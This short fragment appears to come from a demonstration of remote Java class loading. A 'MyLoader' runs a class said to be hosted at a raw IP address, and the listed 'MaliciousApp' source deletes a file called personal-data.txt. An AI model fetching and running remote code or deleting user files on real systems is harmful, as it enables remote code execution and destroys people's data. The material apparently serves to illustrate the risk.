Run:
java MyLoader MaliciousApp


MaliciousApp.java is compiled and stored at http://199.116.235.55/MaliciousApp.class


import java.io.File;

public class MaliciousApp {
   public static void main(String argv[]) {
      try {
         File file = new File("personal-data.txt");
         if(file.delete() == true) {
            System.out.println("File: "+ file + " has been deleted!");
         } else {
            System.out.println("Cannot delete file!");
         }
      } catch(Exception e) {
         System.out.println("Exception: "+e.getMessage());
      }
   }
}